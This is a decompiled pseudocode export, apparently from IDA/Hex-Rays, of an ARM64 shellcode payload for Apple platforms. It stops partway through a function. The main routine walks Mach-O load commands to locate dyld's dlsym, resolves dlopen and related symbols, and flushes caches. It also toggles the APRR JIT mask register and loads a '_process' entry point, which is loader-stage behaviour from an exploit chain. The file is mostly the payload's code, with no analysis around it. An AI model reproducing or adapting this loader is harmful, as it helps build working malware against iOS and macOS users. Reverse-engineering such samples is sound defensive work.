// Pseudocode / Disassembly export
// Source: final_payload_A_16434916_shellcode.bin
// Functions: 77
// Hex-Rays: available
// Generated: 2026-03-05 01:10:30

////////////////////////////////////////////////////////////////////////
// Function: sub_0
// Address:  0x0  Size: 76 bytes
// Calls:    sub_298
////////////////////////////////////////////////////////////////////////

__int64 sub_0()
{
  __int64 v0; // x0

  v0 = sub_298(-184);
  return MEMORY[0xFFFFFFFFFFFFFF48](v0);
}


////////////////////////////////////////////////////////////////////////
// Function: sub_5C
// Address:  0x5C  Size: 96 bytes
// Calls:    sub_BC
// Xrefs:    168 callers
////////////////////////////////////////////////////////////////////////

__int64 __fastcall sub_5C(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 (*v4)(void); // x10

  if ( !MEMORY[0xFFFFFFFFFFFFFFD0] )
    return v4();
  sub_BC(v4, MEMORY[0xFFFFFFFFFFFFFFD8]);
  return MEMORY[0xFFFFFFFFFFFFFFD0](a1, a2, MEMORY[0xFFFFFFFFFFFFFFC8], a4);
}


////////////////////////////////////////////////////////////////////////
// Function: sub_BC
// Address:  0xBC  Size: 60 bytes
// Xrefs:    5 callers
////////////////////////////////////////////////////////////////////////

void sub_BC()
{
  ;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_F8
// Address:  0xF8  Size: 60 bytes
// Xrefs:    7 callers
////////////////////////////////////////////////////////////////////////

void sub_F8()
{
  ;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_134
// Address:  0x134  Size: 60 bytes
// Xrefs:    2 callers
////////////////////////////////////////////////////////////////////////

void sub_134()
{
  ;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_170
// Address:  0x170  Size: 80 bytes
// Xrefs:    1 callers
////////////////////////////////////////////////////////////////////////

void sub_170()
{
  ;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_200
// Address:  0x200  Size: 8 bytes
// Xrefs:    2 callers
////////////////////////////////////////////////////////////////////////

void sub_200()
{
  __dsb(0xBu);
}


////////////////////////////////////////////////////////////////////////
// Function: sub_208
// Address:  0x208  Size: 60 bytes
// Xrefs:    2 callers
////////////////////////////////////////////////////////////////////////

__int64 __fastcall sub_208(__int64 result, __int64 a2)
{
  unsigned __int64 v2; // x9
  unsigned __int64 v3; // x10

  if ( a2 )
  {
    v2 = result & 0xFFFFFFFFFFFFFFC0LL;
    v3 = ~((a2 + (unsigned __int64)(result & 0x3F) - 1) >> 6);
    __dsb(0xBu);
    do
    {
      __asm { IC              IVAU, X9 }
      v2 += 64LL;
      ++v3;
    }
    while ( v3 );
    __dsb(0xBu);
    __isb(0xFu);
  }
  return result;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_250
// Address:  0x250  Size: 12 bytes
// Xrefs:    1 callers
////////////////////////////////////////////////////////////////////////

void sub_250()
{
  __asm { SVC             0x80 }
}


////////////////////////////////////////////////////////////////////////
// Function: sub_25C
// Address:  0x25C  Size: 12 bytes
// Xrefs:    1 callers
////////////////////////////////////////////////////////////////////////

void sub_25C()
{
  __asm { SVC             0x80 }
}


////////////////////////////////////////////////////////////////////////
// Function: sub_268
// Address:  0x268  Size: 12 bytes
// Xrefs:    1 callers
////////////////////////////////////////////////////////////////////////

void sub_268()
{
  __asm { SVC             0x80 }
}


////////////////////////////////////////////////////////////////////////
// Function: sub_274
// Address:  0x274  Size: 12 bytes
// Xrefs:    2 callers
////////////////////////////////////////////////////////////////////////

void sub_274()
{
  __asm { SVC             0x80 }
}


////////////////////////////////////////////////////////////////////////
// Function: sub_280
// Address:  0x280  Size: 12 bytes
// Xrefs:    2 callers
////////////////////////////////////////////////////////////////////////

void sub_280()
{
  __asm { SVC             0x80 }
}


////////////////////////////////////////////////////////////////////////
// Function: sub_28C
// Address:  0x28C  Size: 12 bytes
// Xrefs:    1 callers
////////////////////////////////////////////////////////////////////////

void sub_28C()
{
  __asm { SVC             0x80 }
}


////////////////////////////////////////////////////////////////////////
// Function: sub_298
// Address:  0x298  Size: 3092 bytes
// Calls:    sub_5C, sub_1A9C, sub_1440, sub_10EC, sub_1554, sub_200, sub_208, sub_1EA0, sub_1B60, loc_2160, sub_1680, sub_2200
// Xrefs:    1 callers
// Strings:  "task_info", "sys_dcache_flush", "sys_icache_invalidate", "dlopen", "dladdr", "dlclose", "dlerror", "P@", "__LINKEDIT", "__dyld_dlsym"
////////////////////////////////////////////////////////////////////////

__int64 __fastcall sub_298(
        _QWORD *a1,
        __int64 a2,
        __int64 a3,
        __int64 a4,
        __int64 a5,
        __int64 a6,
        __int64 a7,
        __int64 a8,
        __int64 a9,
        __int64 a10,
        __int64 a11)
{
  __int64 v12; // x23
  __int64 v13; // x24
  __int64 v14; // x0
  __int64 v15; // x0
  __int64 v16; // x2
  __int64 v17; // x3
  __int64 v18; // x22
  __int64 v19; // x2
  __int64 v20; // x3
  __int64 v21; // x2
  __int64 v22; // x3
  __int64 v23; // x0
  __int64 v24; // x2
  __int64 v25; // x3
  __int64 v26; // x0
  __int64 v27; // x2
  __int64 v28; // x3
  __int64 v29; // x0
  __int64 v30; // x2
  __int64 v31; // x3
  __int64 v32; // x0
  unsigned __int64 v33; // x9
  int v34; // w0
  __int64 v35; // x2
  __int64 v36; // x3
  __int64 v37; // x20
  __int64 v38; // x21
  __int64 v39; // x0
  __int64 v40; // x20
  int v41; // w21
  int v42; // w0
  __int64 v43; // x22
  __int64 v44; // x8
  unsigned __int64 v45; // x23
  __int64 v46; // x8
  unsigned __int64 v47; // x24
  unsigned __int64 v48; // x26
  unsigned __int64 v49; // x28
  unsigned __int64 v50; // x27
  unsigned __int64 v52; // x8
  bool v53; // cf
  unsigned int v54; // w10
  unsigned __int64 v55; // x8
  unsigned __int64 v56; // x8
  unsigned __int64 v57; // x8
  unsigned __int64 v58; // x11
  __int64 v59; // x13
  __int64 v60; // x14
  __int64 v61; // x9
  __int64 v62; // x23
  __int64 v63; // x9
  unsigned int v64; // w8
  __int64 v65; // x24
  unsigned __int64 i; // x26
  __int64 v67; // x0
  __int64 v68; // x0
  bool v69; // w8
  __int64 v70; // x10
  __int64 v71; // x9
  __int64 v72; // x9
  __int64 v73; // x2
  __int64 v74; // x3
  __int64 v75; // x2
  __int64 v76; // x3
  int v77; // w19
  __int64 v78; // x1
  __int64 v79; // x2
  __int64 v80; // x3
  __int64 v81; // x1
  __int64 v82; // x2
  __int64 v83; // x3
  __int64 v84; // x9
  __int64 v85; // x8
  __int64 v86; // x28
  __int64 v87; // x22
  unsigned __int64 v88; // x13
  unsigned __int64 v89; // x12
  __int64 v90; // x8
  unsigned __int64 v91; // x26
  unsigned __int64 v92; // x27
  unsigned __int64 v93; // x23
  unsigned __int64 v95; // x9
  int v97; // w8
  unsigned int v98; // w10
  unsigned int v100; // w8
  unsigned int *v101; // x9
  unsigned __int64 v102; // x11
  __int64 v103; // x13
  __int64 v104; // x14
  unsigned __int64 v105; // x8
  unsigned __int64 v106; // x9
  __int64 v107; // x11
  __int64 v108; // x12
  __int64 v109; // x0
  __int64 v110; // x3
  __int64 v111; // x0
  __int64 v112; // x2
  __int64 v113; // x3
  __int64 v114; // x0
  __int64 v115; // x2
  __int64 v116; // x3
  __int64 v117; // x0
  __int64 v118; // x2
  __int64 v119; // x3
  __int64 v120; // x0
  __int64 v121; // x2
  __int64 v122; // x3
  __int64 v123; // x0
  unsigned __int64 v124; // x9
  __int64 v125; // x2
  __int64 v126; // x3
  BOOL v127; // w8
  __int64 v128; // x0
  __int64 v129; // x10
  __int64 v130; // x9
  __int64 v131; // x9
  __int64 v132; // x19
  __int64 v133; // x20
  char *v134; // x9
  __int64 v135; // x10
  char *v136; // x8
  const char *v137; // x11
  char *v138; // x12
  __int64 v139; // x13
  bool v140; // zf
  char *v141; // x14
  char *v142; // x12
  int v143; // w13
  char *v144; // x12
  int v145; // w15
  bool v146; // w16
  const char *v147; // x14
  int v148; // w17
  int v149; // w0
  int v150; // t1
  int v151; // t1
  int v153; // t1
  unsigned __int64 v154; // x13
  __int64 v155; // x11
  char *v156; // x12
  char v157; // t1
  bool v158; // cc
  unsigned __int64 v159; // x15
  char v160; // t1
  unsigned __int64 v161; // x11
  __int64 v162; // x10
  char *v163; // x9
  char v164; // t1
  unsigned __int64 v165; // x11
  __int64 v166; // x10
  char v167; // t1
  __int64 v168; // [xsp+8h] [xbp-6F8h]
  __int64 v169; // [xsp+10h] [xbp-6F0h]
  unsigned __int64 v170; // [xsp+18h] [xbp-6E8h]
  unsigned __int64 v171; // [xsp+20h] [xbp-6E0h]
  unsigned int v172; // [xsp+2Ch] [xbp-6D4h] BYREF
  __int64 v173; // [xsp+30h] [xbp-6D0h] BYREF
  __int64 v174; // [xsp+38h] [xbp-6C8h]
  __int64 v175; // [xsp+40h] [xbp-6C0h]
  __int64 v176; // [xsp+48h] [xbp-6B8h]
  __int64 v177; // [xsp+50h] [xbp-6B0h]
  void *v178; // [xsp+58h] [xbp-6A8h]
  unsigned __int64 v179; // [xsp+78h] [xbp-688h]
  int v180; // [xsp+80h] [xbp-680h]
  __int64 v181; // [xsp+88h] [xbp-678h]
  unsigned int v182; // [xsp+90h] [xbp-670h]
  __int64 v183; // [xsp+A8h] [xbp-658h]
  __int64 v184; // [xsp+B0h] [xbp-650h]
  __int64 v185; // [xsp+C8h] [xbp-638h]
  __int64 v186; // [xsp+D0h] [xbp-630h]
  __int64 v187; // [xsp+D8h] [xbp-628h]
  __int64 (__fastcall *v188)(); // [xsp+E0h] [xbp-620h]
  bool v189; // [xsp+5F0h] [xbp-110h]
  bool v190; // [xsp+5F1h] [xbp-10Fh]
  bool v191; // [xsp+5F5h] [xbp-10Bh]
  __int64 v192; // [xsp+610h] [xbp-F0h]
  bool v193; // [xsp+61Ah] [xbp-E6h]
  bool v194; // [xsp+61Bh] [xbp-E5h]
  char v195; // [xsp+67Fh] [xbp-81h] BYREF
  __int64 v196; // [xsp+680h] [xbp-80h] BYREF
  unsigned int v197; // [xsp+68Ch] [xbp-74h] BYREF
  __int64 v198[4]; // [xsp+690h] [xbp-70h] BYREF

  v172 = 0;
  if ( !a1[17] )
  {
    v37 = a1[4] + a1[3];
    v38 = a1[5] - v37;
    sub_200();
    sub_208(v37, v38);
    sub_1440(&v173, 1608);
    v39 = sub_1A9C(0);
    if ( (unsigned int)(v39 + 1) < 2 )
      return 106501;
    v40 = v39;
    v195 = 0;
    v41 = sub_1EA0(&v195);
    if ( v41 )
      return v41;
    if ( v195 )
      goto LABEL_10;
    v197 = 5;
    if ( (unsigned int)sub_1B60(v40, 17, v198, &v197) )
      goto LABEL_10;
    if ( v197 != 5 )
      goto LABEL_10;
    if ( !v198[0] )
      goto LABEL_10;
    v43 = *(_QWORD *)(v198[0] + 32);
    if ( !v43 )
      goto LABEL_10;
    v44 = *(unsigned int *)(v43 + 20);
    if ( (_DWORD)v44 )
    {
      v45 = 0;
      v46 = v44 + v43;
      v47 = v46 + 32;
      v48 = v46 + 24;
      v49 = v43 + 32;
      v50 = -1;
      do
      {
        if ( v49 + 8 > v47 || v49 > v48 )
          return 94209;
        v52 = *(unsigned int *)(v49 + 4);
        v53 = (unsigned int)v52 >= 8 && v47 - v49 >= v52;
        if ( !v53 )
          return 94209;
        v54 = *(_DWORD *)v49 == 25 ? 72 : 0;
        if ( (unsigned int)v52 < v54 )
          return 94209;
        if ( *(_DWORD *)v49 == 25 && (unsigned int)((__int64 (*)(void))loc_2160)() )
        {
          v55 = *(_QWORD *)(v49 + 24);
          if ( v55 < v50 )
            v50 = *(_QWORD *)(v49 + 24);
          v56 = *(_QWORD *)(v49 + 32) + v55;
          if ( v56 > v45 )
            v45 = v56;
        }
        v49 += *(unsigned int *)(v49 + 4);
      }
      while ( v49 < v47 );
      v57 = v45 - v50;
      if ( v45 > v50 )
      {
        if ( v57 < 0x16 )
        {
LABEL_43:
          if ( v57 < 0xD )
            goto LABEL_10;
          v58 = 0;
          v59 = v43;
          while ( 1 )
          {
            v60 = 0;
            v61 = v43 + v58;
            while ( *(unsigned __int8 *)(v59 + v60) == (unsigned __int8)aDyldDlsym[v60] )
            {
              if ( ++v60 == 13 )
                goto LABEL_122;
            }
            ++v58;
            ++v59;
            if ( v58 > v57 - 13 )
              goto LABEL_10;
          }
        }
        v102 = 0;
        v103 = v43;
        while ( 1 )
        {
          v104 = 0;
          v61 = v43 + v102;
          while ( *(unsigned __int8 *)(v103 + v104) == (unsigned __int8)aDyldDlsymInter[v104] )
          {
            if ( ++v104 == 22 )
            {
LABEL_122:
              v196 = v61;
              v53 = v57 >= 8;
              v105 = v57 - 8;
              if ( !v53 )
                goto LABEL_10;
              v106 = 0;
              v107 = v43;
              while ( 1 )
              {
                v108 = 0;
                while ( *(unsigned __int8 *)(v107 + v108) == *((unsigned __int8 *)&v196 + v108) )
                {
                  if ( ++v108 == 8 )
                  {
                    v109 = sub_10EC(*(_QWORD *)(v43 + v106 + 8));
                    if ( v109 )
                    {
                      v174 = sub_5C(-2, (__int64)"dlsym", v109, v110);
                      if ( sub_10EC(v174) )
                      {
                        v111 = v174;
LABEL_134:
                        v174 = sub_10EC(v111);
                        v114 = sub_5C(-2, (__int64)"dlopen", v112, v113);
                        v173 = sub_10EC(v114);
                        v117 = sub_5C(-2, (__int64)"dladdr", v115, v116);
                        v175 = sub_10EC(v117);
                        v120 = sub_5C(-2, (__int64)"dlclose", v118, v119);
                        v176 = sub_10EC(v120);
                        v123 = sub_5C(-2, (__int64)"dlerror", v121, v122);
                        v177 = sub_10EC(v123);
                        v192 = sub_10EC(a1[8]);
                        v188 = sub_1510;
                        v124 = (a1[1] + 65543LL) & 0xFFFFFFFFFFFFFFF8LL;
                        v178 = &loc_14BC;
                        v179 = v124;
                        v180 = 8323072;
                        v34 = sub_1554(&v173, &v172);
                        if ( !v34 )
                        {
                          v189 = v172 == 1;
                          v127 = v172 > 1;
                          v190 = v172 > 1;
                          if ( v172 == 1 )
                          {
                            _WriteStatusReg(APRR_JIT_MASK_EL2, 0);
                            __isb(0xFu);
                            v127 = v190;
                          }
                          if ( v127 )
                          {
                            v128 = sub_5C(-2, (__int64)"mach_eventlink_create", v125, v126);
                            LOBYTE(v127) = sub_10EC(v128) != 0;
                          }
                          v191 = v127;
                          v34 = sub_1680(&v173, v40, a1[1]);
                          if ( !v34 )
                          {
                            sub_2200(&v173);
                            v129 = a1[6];
                            v183 = a1[7];
                            v130 = a1[10];
                            v186 = a1[9];
                            v187 = v130;
                            v184 = a1[5];
                            v185 = v129;
                            v131 = a1[22];
                            v193 = a1[21] != 0;
                            v194 = v131 != 0;
                            v182 = *((_DWORD *)a1 + 8);
                            v181 = a1[3];
                            v34 = sub_5C((__int64)&v173, v181, v182, (__int64)v198);
                            if ( !v34 )
                            {
                              v132 = *(_QWORD *)(v198[0] + 88);
                              v133 = *(unsigned int *)(v198[0] + 168);
                              sub_200();
                              sub_208(v132, v133);
LABEL_68:
                              v77 = sub_5C((__int64)&v173, v198[0], (__int64)"_process", (__int64)&v196);
                              v78 = v198[0];
                              *(_BYTE *)(v198[0] + 172) = *(_BYTE *)(v198[0] + 172) & 0x7F | ((v77 == 0) << 7);
                              v34 = sub_5C((__int64)&v173, v78, v79, v80);
                              if ( v77 )
                                return v77;
                              if ( !v34 )
                                return (int)sub_5C((__int64)&v173, v81, v82, v83);
                            }
                          }
                        }
                        return v34;
                      }
                    }
LABEL_10:
                    LODWORD(v196) = 5;
                    v42 = sub_1B60(v40, 17, v198, &v196);
                    if ( v42 )
                      return (int)(v42 | 0x80000000);
                    v41 = 708642;
                    if ( (_DWORD)v196 != 5 )
                      return 708628;
                    v62 = v198[0];
                    if ( v198[0] )
                    {
                      v63 = *(_QWORD *)(v198[0] + 8);
                      if ( v63 )
                      {
                        v64 = *(_DWORD *)(v198[0] + 4);
                        if ( v64 )
                        {
                          v65 = 0;
                          for ( i = 1; ; ++i )
                          {
                            v67 = *(_QWORD *)(v63 + v65 + 8);
                            if ( !v67 )
                              goto LABEL_59;
                            if ( !(unsigned int)((__int64 (__fastcall *)(__int64, const char *))loc_2160)(
                                                  v67,
                                                  "/usr/lib/system/libdyld.dylib") )
                              break;
                            v64 = *(_DWORD *)(v62 + 4);
LABEL_59:
                            if ( i >= v64 )
                              return 708625;
                            v63 = *(_QWORD *)(v62 + 8);
                            v65 += 24;
                          }
                          v84 = *(_QWORD *)(*(_QWORD *)(v62 + 8) + v65);
                          v85 = *(unsigned int *)(v84 + 20);
                          v169 = v84;
                          if ( (_DWORD)v85 )
                          {
                            v86 = 0;
                            v168 = 0;
                            v87 = 0;
                            v88 = 0;
                            v89 = 0;
                            v90 = v85 + v84;
                            v91 = v90 + 32;
                            v92 = v90 + 24;
                            v93 = v84 + 32;
                            while ( 1 )
                            {
                              if ( v93 + 8 > v91 || v93 > v92 )
                                return 94209;
                              v95 = *(unsigned int *)(v93 + 4);
                              if ( (unsigned int)v95 < 8 || v91 - v93 < v95 )
                                return 94209;
                              v97 = *(_DWORD *)v93;
                              if ( *(int *)v93 > 24 )
                                break;
                              if ( v97 == -2147483614 )
                                goto LABEL_90;
                              if ( v97 != -2147483597 )
                                goto LABEL_103;
                              v98 = 16;
LABEL_92:
                              if ( (unsigned int)v95 < v98 )
                                return 94209;
                              if ( v97 > 24 )
                              {
                                if ( v97 == 25 )
                                {
                                  v170 = v89;
                                  v171 = v88;
                                  if ( (unsigned int)((__int64 (__fastcall *)(unsigned __int64, const char *))loc_2160)(
                                                       v93 + 8,
                                                       "__TEXT") )
                                  {
                                    if ( !(unsigned int)((__int64 (__fastcall *)(unsigned __int64, const char *))loc_2160)(
                                                          v93 + 8,
                                                          "__LINKEDIT") )
                                    {
                                      v86 = *(_QWORD *)(v93 + 32);
                                      v87 = *(_QWORD *)(v93 + 24) + v168 - *(_QWORD *)(v93 + 40);
                                    }
                                  }
                                  else
                                  {
                                    v168 = v169 - *(_QWORD *)(v93 + 24);
                                  }
                                  v89 = v170;
                                  v88 = v171;
                                  goto LABEL_103;
                                }
LABEL_97:
                                v89 = v93;
                                goto LABEL_103;
                              }
                              if ( v97 == -2147483614 )
                                goto LABEL_97;
                              v88 = v93;
LABEL_103:
                              v93 += *(unsigned int *)(v93 + 4);
                              if ( v93 >= v91 )
                                goto LABEL_109;
                            }
                            if ( v97 == 25 )
                            {
                              v98 = 72;
                              goto LABEL_92;
                            }
                            if ( v97 != 34 )
                              goto LABEL_103;
LABEL_90:
                            v98 = 48;
                            goto LABEL_92;
                          }
                          v89 = 0;
                          v88 = 0;
                          v87 = 0;
                          v86 = 0;
LABEL_109:
                          v41 = 708625;
                          if ( v89 | v88 )
                          {
                            if ( v87 && v86 )
                            {
                              v41 = 9502721;
                              if ( v89 )
                              {
                                v100 = *(_DWORD *)(v89 + 44);
                                if ( v100 )
                                {
                                  v101 = (unsigned int *)(v89 + 40);
LABEL_145:
                                  v134 = (char *)(v87 + *v101);
                                  v135 = v100;
                                  v136 = &v134[v100];
                                  v137 = "_dlsym";
                                  v138 = v134;
LABEL_146:
                                  if ( *v138 < 0 )
                                  {
                                    v159 = 0;
                                    v139 = 0;
                                    v141 = v138 + 10;
                                    while ( 1 )
                                    {
                                      if ( v138 == v136 )
                                      {
                                        v139 = 0;
                                        v141 = v136;
                                        goto LABEL_154;
                                      }
                                      if ( v159 > 0x3F )
                                        break;
                                      v160 = *v138++;
                                      v139 |= (unsigned __int64)(v160 & 0x7F) << v159;
                                      v159 += 7LL;
                                      if ( (v160 & 0x80) == 0 )
                                        goto LABEL_148;
                                    }
                                    v139 = 0;
                                  }
                                  else
                                  {
                                    v139 = (unsigned __int8)*v138++;
LABEL_148:
                                    if ( *v137 )
                                      v140 = 1;
                                    else
                                      v140 = v139 == 0;
                                    if ( !v140 )
                                    {
                                      v161 = 0;
                                      v162 = 0;
                                      v163 = v138 + 10;
                                      do
                                      {
                                        if ( v138 == v136 )
                                        {
                                          v163 = v136;
                                          goto LABEL_197;
                                        }
                                        if ( v161 > 0x3F )
                                          goto LABEL_197;
                                        v164 = *v138++;
                                        v162 |= (unsigned __int64)(v164 & 0x7F) << v161;
                                        v161 += 7LL;
                                      }
                                      while ( v164 < 0 );
                                      if ( ((unsigned __int8)v162 & 3u) >= 2uLL )
                                      {
                                        if ( (v162 & 3) != 2 )
                                          return 9502728;
                                        a11 = 0;
                                      }
                                      v163 = v138;
LABEL_197:
                                      v165 = 0;
                                      v166 = 0;
                                      while ( v163 != v136 && v165 <= 0x3F )
                                      {
                                        v167 = *v163++;
                                        v166 |= (unsigned __int64)(v167 & 0x7F) << v165;
                                        v165 += 7LL;
                                        if ( (v167 & 0x80) == 0 )
                                        {
                                          if ( v166 )
                                          {
                                            v111 = v166 + a11;
                                            goto LABEL_134;
                                          }
                                          return 9502722;
                                        }
                                      }
                                      return 9502722;
                                    }
                                    v141 = v138;
                                  }
LABEL_154:
                                  v142 = &v141[v139];
                                  if ( &v141[v139] <= v136 )
                                  {
                                    v143 = (unsigned __int8)*v142;
                                    if ( *v142 )
                                    {
                                      v144 = v142 + 1;
                                      while ( 1 )
                                      {
                                        v145 = (unsigned __int8)*v144;
                                        if ( !*v144 )
                                          break;
                                        v146 = 0;
                                        v147 = v137;
                                        do
                                        {
                                          if ( v146 )
                                          {
                                            while ( *++v144 )
                                              ;
                                            goto LABEL_164;
                                          }
                                          v148 = v145;
                                          v150 = *(unsigned __int8 *)v147++;
                                          v149 = v150;
                                          v146 = v145 != v150;
                                          v151 = (unsigned __int8)*++v144;
                                          v145 = v151;
                                        }
                                        while ( v151 );
                                        if ( v148 == v149 )
                                          goto LABEL_170;
LABEL_164:
                                        ++v144;
                                        do
                                          v153 = *v144++;
                                        while ( v153 < 0 );
                                        if ( v144 <= v136 )
                                        {
                                          if ( (_BYTE)--v143 )
                                            continue;
                                        }
                                        return v41;
                                      }
                                      v147 = v137;
LABEL_170:
                                      v154 = 0;
                                      v155 = 0;
                                      v156 = v144 + 1;
                                      while ( v156 != v136 && v154 <= 0x3F )
                                      {
                                        v157 = *v156++;
                                        v155 |= (unsigned __int64)(v157 & 0x7F) << v154;
                                        v154 += 7LL;
                                        if ( (v157 & 0x80) == 0 )
                                        {
                                          v138 = &v134[v155];
                                          if ( v155 )
                                            v158 = v155 <= v135;
                                          else
                                            v158 = 0;
                                          v137 = v147;
                                          if ( v158 )
                                            goto LABEL_146;
                                          return v41;
                                        }
                                      }
                                    }
                                  }
                                  return v41;
                                }
                                return 9502726;
                              }
                              else
                              {
                                if ( v88 )
                                {
                                  v100 = *(_DWORD *)(v88 + 12);
                                  if ( v100 )
                                  {
                                    v101 = (unsigned int *)(v88 + 8);
                                    goto LABEL_145;
                                  }
                                }
                                return 9502726;
                              }
                            }
                          }
                        }
                      }
                    }
                    return v41;
                  }
                }
                v106 += 8LL;
                v107 += 8;
                if ( v106 > v105 )
                  goto LABEL_10;
              }
            }
          }
          ++v102;
          ++v103;
          if ( v102 > v57 - 22 )
            goto LABEL_43;
        }
      }
    }
    return 94209;
  }
  v12 = 106501;
  v197 = 0;
  v13 = a1[19];
  v14 = sub_5C(-2, (__int64)"task_info", a3, a4);
  if ( v14 )
  {
    v15 = sub_1A9C(v14);
    if ( (unsigned int)(v15 + 1) >= 2 )
    {
      v18 = v15;
      sub_5C(-2, (__int64)"sys_dcache_flush", v16, v17);
      if ( sub_5C(-2, (__int64)"sys_icache_invalidate", v19, v20) )
      {
        sub_1440(&v173, 1608);
        v174 = v13;
        v23 = sub_5C(-2, (__int64)"dlopen", v21, v22);
        v173 = sub_10EC(v23);
        v26 = sub_5C(-2, (__int64)"dladdr", v24, v25);
        v175 = sub_10EC(v26);
        v29 = sub_5C(-2, (__int64)"dlclose", v27, v28);
        v176 = sub_10EC(v29);
        v32 = sub_5C(-2, (__int64)"dlerror", v30, v31);
        v177 = sub_10EC(v32);
        v192 = sub_10EC(a1[8]);
        v188 = sub_1510;
        v33 = (a1[1] + 65543LL) & 0xFFFFFFFFFFFFFFF8LL;
        v178 = &loc_14BC;
        v179 = v33;
        v180 = 8323072;
        v34 = sub_1554(&v173, &v197);
        if ( v34 )
          return v34;
        v189 = v197 == 1;
        v190 = v197 > 1;
        if ( v197 != 1 )
        {
          if ( v197 < 2 )
          {
            v69 = 0;
          }
          else
          {
            v68 = sub_5C(-2, (__int64)"mach_eventlink_create", v35, v36);
            v69 = sub_10EC(v68) != 0;
          }
          v191 = v69;
          v34 = sub_1680(&v173, v18, a1[1]);
          if ( !v34 )
          {
            sub_2200(&v173);
            v70 = a1[6];
            v183 = a1[7];
            v71 = a1[10];
            v186 = a1[9];
            v187 = v71;
            v184 = a1[5];
            v185 = v70;
            v72 = a1[22];
            v193 = a1[21] != 0;
            v194 = v72 != 0;
            v182 = *((_DWORD *)a1 + 8);
            v181 = a1[3];
            v34 = sub_5C((__int64)&v173, v181, v182, (__int64)v198);
            if ( !v34 )
            {
              sub_5C(*(_QWORD *)(v198[0] + 88), *(unsigned int *)(v198[0] + 168), v73, v74);
              sub_5C(*(_QWORD *)(v198[0] + 88), *(unsigned int *)(v198[0] + 168), v75, v76);
              goto LABEL_68;
            }
          }
          return v34;
        }
        return 4096;
      }
    }
  }
  return v12;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_EAC
// Address:  0xEAC  Size: 8 bytes
// Xrefs:    2 callers
////////////////////////////////////////////////////////////////////////

void sub_EAC()
{
  ;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_EB4
// Address:  0xEB4  Size: 8 bytes
// Xrefs:    1 callers
////////////////////////////////////////////////////////////////////////

void sub_EB4()
{
  ;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_EBC
// Address:  0xEBC  Size: 8 bytes
// Xrefs:    1 callers
////////////////////////////////////////////////////////////////////////

void sub_EBC()
{
  ;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_EC4
// Address:  0xEC4  Size: 8 bytes
// Xrefs:    1 callers
////////////////////////////////////////////////////////////////////////

void sub_EC4()
{
  ;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_ECC
// Address:  0xECC  Size: 36 bytes
// Xrefs:    3 callers
////////////////////////////////////////////////////////////////////////

__int64 sub_ECC()
{
  return 0;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_EF0
// Address:  0xEF0  Size: 8 bytes
// Xrefs:    1 callers
////////////////////////////////////////////////////////////////////////

void sub_EF0()
{
  ;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_EF8
// Address:  0xEF8  Size: 88 bytes
// Calls:    sub_F8, sub_5C
// Xrefs:    1 callers
////////////////////////////////////////////////////////////////////////

__int64 __fastcall sub_EF8(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 v4; // x0

  sub_F8();
  v4 = sub_5C(a1, a2, a3, a4);
  return sub_F50(v4);
}


////////////////////////////////////////////////////////////////////////
// Function: sub_F50
// Address:  0xF50  Size: 168 bytes
// Calls:    sub_F8, sub_5C
// Xrefs:    2 callers
////////////////////////////////////////////////////////////////////////

__int64 __fastcall sub_F50(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 v4; // x19
  __int64 v5; // x20
  __int64 v6; // x21
  __int64 v7; // x22
  __int64 v8; // x0
  __int64 v9; // x10
  __int64 v10; // x0
  __int64 v11; // x1
  __int64 v12; // x2
  __int64 v13; // x3
  __int64 v14; // x0
  __int64 v15; // x30
  __int64 v16; // x2
  __int64 v17; // x3
  __int64 v18; // x1
  __int64 v19; // x0
  __int64 v20; // x10
  __int64 v21; // x0
  __int64 v22; // x1
  __int64 v23; // x2
  __int64 v24; // x3
  __int64 v25; // x0
  _QWORD v27[2]; // [xsp+0h] [xbp-80h]
  __int64 v28; // [xsp+10h] [xbp-70h]
  __int64 v29; // [xsp+18h] [xbp-68h]
  __int64 v30; // [xsp+20h] [xbp-60h]
  __int64 v31; // [xsp+28h] [xbp-58h]
  __int64 v32; // [xsp+30h] [xbp-50h]
  __int64 v33; // [xsp+38h] [xbp-48h]
  _QWORD v34[2]; // [xsp+40h] [xbp-40h]
  __int64 v35; // [xsp+50h] [xbp-30h]
  __int64 v36; // [xsp+58h] [xbp-28h]
  __int64 v37; // [xsp+60h] [xbp-20h]
  __int64 v38; // [xsp+68h] [xbp-18h]
  _QWORD v39[2]; // [xsp+70h] [xbp-10h] BYREF

  v37 = a3;
  v38 = a4;
  v35 = a1;
  v36 = a2;
  sub_F8();
  v9 = v8;
  v10 = v35;
  v11 = v36;
  v12 = v37;
  v13 = v38;
  v37 = v5;
  v38 = v4;
  v39[0] = v34[0];
  v39[1] = v9;
  *(_DWORD *)((char *)v34 + v13) = v36;
  v14 = sub_5C(v10, v11, v12, v13);
  v27[0] = v39;
  v27[1] = v15;
  v30 = v16;
  v31 = v17;
  v28 = v14;
  v29 = v18;
  sub_F8();
  v20 = v19;
  v21 = v28;
  v22 = v29;
  v23 = v30;
  v24 = v31;
  v32 = v7;
  v33 = v6;
  v34[0] = v39;
  v34[1] = v20;
  *(_DWORD *)((char *)v27 + v31) = v29;
  v25 = sub_5C(v21, v22, v23, v24);
  return sub_FF8(v25);
}


////////////////////////////////////////////////////////////////////////
// Function: sub_FF8
// Address:  0xFF8  Size: 92 bytes
// Calls:    sub_F8, sub_5C
// Xrefs:    2 callers
////////////////////////////////////////////////////////////////////////

__int64 __fastcall sub_FF8(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 v4; // x19
  __int64 v5; // x20
  __int64 v6; // x21
  __int64 v7; // x22
  __int64 v8; // x23
  __int64 v9; // x24
  __int64 v10; // x0
  __int64 v11; // x10
  __int64 v12; // x0
  __int64 v13; // x1
  __int64 v14; // x2
  __int64 v15; // x3
  __int64 v16; // x29
  __int64 v17; // x0
  _BYTE v19[16]; // [xsp-10h] [xbp-50h]
